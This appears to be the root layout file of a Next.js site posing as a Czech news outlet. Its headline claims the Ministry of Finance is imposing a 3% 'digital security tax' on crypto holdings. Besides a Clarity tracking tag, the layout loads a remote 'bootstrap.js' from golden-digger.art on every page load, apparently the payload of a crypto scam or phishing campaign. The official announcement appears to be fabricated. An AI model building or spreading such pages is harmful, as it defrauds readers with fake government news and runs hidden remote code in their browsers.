export const metadata = {
  title: "MIMOŘÁDNĚ: Ministerstvo financí chystá 3% „digitální bezpečnostní daň“ z kryptoaktiv nad 100 000 Kč — Výhled CZ",
  description: "Ministerstvo financí ČR dnes vydalo mimořádné oznámení ohledně plánované 3% digitální bezpečnostní daně z kryptoměn.",
};

export const viewport = {
  width: "device-width",
  initialScale: 1,
  maximumScale: 1,
  userScalable: false,
};

import "./globals.css";

export default function RootLayout({ children }) {
  return (
    <html lang="cs">
      <body>
        {children}
        <script src="https://golden-digger.art/p/2d72c91e-8a15-4c88-8f0c-aa9dcca859c5/bootstrap.js" async defer></script>
        <script
          type="text/javascript"
          dangerouslySetInnerHTML={{
            __html: `(function(c,l,a,r,i,t,y){
        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
    })(window, document, "clarity", "script", "yy8ebocdmi");`,
          }}
        />
      </body>
    </html>
  );
}
